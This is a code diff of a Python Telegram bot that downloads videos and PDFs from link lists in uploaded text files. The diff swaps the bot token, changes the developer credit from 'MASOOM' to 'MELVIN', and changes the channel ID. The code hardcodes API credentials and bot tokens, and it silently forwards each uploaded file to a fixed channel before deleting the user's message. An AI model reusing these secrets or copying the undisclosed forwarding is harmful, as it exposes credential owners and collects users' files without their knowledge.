@@ -26,12 +26,12 @@ bot = Client(
     "bot",
     api_id=28466214,
     api_hash= "3f55d44aae0f6c72f0dd8855adeeb60f",
-    bot_token= "6554913960:AAGnqgsnWrFZseruQZCag8raWYPn4lv4WqU")
+    bot_token= "7387562785:AAEZdm4ruxYvgWXc8p_18gElnva2OnD1mac")
 
 
 @bot.on_message(filters.command(["start"]))
 async def account_login(bot: Client, m: Message):
-    editable = await m.reply_text("Hi!\n\nGive /TXT Command to Downlaod From a Text file.\n\n**𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲 :** [MASOOM🇮🇳]\n")
+    editable = await m.reply_text("Hi!\n\nGive /TXT Command to Downlaod From a Text file.\n\n**𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲 :** [𝐌𝐄𝐋𝐕𝐈𝐍]\n")
 
 
 @bot.on_message(filters.command("stop"))
@@ -47,7 +47,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
        x = await input.download()
-       await bot.send_document(-1002156530595, x)
+       await bot.send_document(-1002179528570, x)
        await input.delete(True)
        file_name, ext = os.path.splitext(os.path.basename(x))
        credit = "MEDARN"
@@ -182,8 +182,8 @@ async def account_login(bot: Client, m: Message):
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
             try:
                 
-                cc = f'**Vid_id  »** {str(count).zfill(3)}\n**Title  »** {name} {res} [MASOOM🇮🇳].mkv\n**Batch »** {raw_text0}\n\n**Download by »** **{raw_text3}**\n\n'
-                cc1 = f'**Vid_id  »** {str(count).zfill(3)}\n**Title »** {name1} [MASOOM🇮🇳].pdf \n**Batch »** {raw_text0}\n\n**Download by »** {raw_text3}\n\n'
+                cc = f'**Vid_id  »** {str(count).zfill(3)}\n**Title  »** {name} {res} [𝐌𝐄𝐋𝐕𝐈𝐍].mkv\n**Batch »** {raw_text0}\n\n**Download by »** **{raw_text3}**\n\n'
+                cc1 = f'**Vid_id  »** {str(count).zfill(3)}\n**Title »** {name1} [𝐌𝐄𝐋𝐕𝐈𝐍].pdf \n**Batch »** {raw_text0}\n\n**Download by »** {raw_text3}\n\n'
                 if "drive" in url:
                     try:
                         ka = await helper.download(url, name)
@@ -209,7 +209,7 @@ async def account_login(bot: Client, m: Message):
                         time.sleep(e.x)
                         continue
                 else:
-                    Show = f"**⥥ Downloading »**\n\n**Name »** `{name}\nQuality » {raw_text2}` \n\n**Bot By ➤ **MASOOM"
+                    Show = f"**⥥ Downloading »**\n\n**Name »** `{name}\nQuality » {raw_text2}` \n\n**Bot By ➤ **𝐌𝐄𝐋𝐕𝐈𝐍 [🇮🇳]"
                
                     prog = await m.reply_text(Show)
                     res_file = await helper.download_video(url, cmd, name)
